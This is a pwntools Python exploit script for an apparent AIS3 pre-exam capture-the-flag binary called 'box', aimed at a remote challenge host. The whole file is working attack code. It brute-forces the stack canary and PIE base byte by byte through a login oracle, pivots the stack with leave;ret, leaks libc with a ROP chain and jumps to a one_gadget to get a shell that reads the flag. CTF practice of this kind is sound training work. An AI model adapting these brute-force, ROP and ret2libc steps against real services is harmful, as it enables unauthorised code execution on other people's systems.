#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

e , l = ELF( '../bin/box' ) , ELF( './libc-2.27.so' )
host = '60.251.236.18'
host = 'pre-exam-pwn.ais3.org'
y = remote( host , 10006 )
#y = process( '../box/share/box' )

def login( usr , pwd ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , usr )
    y.sendafter( ':' , pwd )

def logout():
    y.sendafter( '>' , '5' )

def new( data ):
    y.sendafter( '>' , '1' )
    y.sendlineafter( '> ' , data )

def update( idx , data ):
    y.sendafter( '>' , '2' )
    y.sendafter( '?' , str( idx ) )
    y.sendafter( '> ' , data )

def dle( idx ):
    y.sendafter( '>' , '4' )
    y.sendafter( '?' , str( idx ) )

y.sendafter( '>' , '1' )
y.sendafter( ':' , 'a' )
y.sendafter( ':' , 'b' )

pwd = 'b'.ljust( 0x88 , '\0' )

canary = '\0'

for i in range( 0x7 ):
    for c in range( 0x100 ):
        login( 'a' , pwd + canary + chr( c ) )
        if 'successfully.' in y.recvline():
            logout()
            canary += chr( c )
            info( 'canary -> %s' % hex( u64( canary.ljust( 8 , '\0' ) ) ) )
            break
        
success( 'canary -> %s' % hex( u64( canary ) ) )

leak = ''

for i in range( 0x6 ):
    for c in range( 0x100 ):
        login( 'a' , pwd + canary + leak + chr( c ) )
        if 'successfully.' in y.recvline():
            logout()
            leak += chr( c )
            info( 'leak -> %s' % hex( u64( leak.ljust( 8 , '\0' ) ) ) )
            break

pie = u64( leak + '\0\0' ) - 0x1240
success( 'pie -> %s' % hex( pie ) )
e.address = pie

#y.interactive()
login( 'a' , 'b' )

for _ in range( 8 ):
    new( 'a' )

dle( 6 )
new( 'a' * 232 )

ret = pie + 0x8c6
leave_ret = pie + 0xb82
buf = pie + 0x202060
pop_rdi = pie + 0x12a3
pop_rbp = pie + 0x0a20
pop_rsi_r15 = pie + 0x12a1
read_plt = e.plt['read']
atoi_plt = e.plt['atoi']
puts_plt = e.plt['puts']
setvbuf_plt = e.plt['setvbuf']
__libc_start_main_got = pie + 0x201fe0

p = flat(
    canary,
    buf + 0x60 - 8,
    leave_ret
)

update( 7 , 'a' * 0xe8 + p[:-1] )

p = flat(
    pop_rdi,
    __libc_start_main_got,
    puts_plt,
    pop_rdi,
    buf,
    atoi_plt,
    pop_rdi,
    0,
    pop_rsi_r15,
    buf + 0x700,
    0,
    read_plt,
    pop_rbp,
    buf + 0x700 - 8,
    leave_ret
)
update( 7 , 'a' * 0x60 + p )

logout()

y.recvline()
l.address = u64( y.recv(6) + '\0\0' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

one = 0x4f322
y.send( p64( l.address + one ) )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()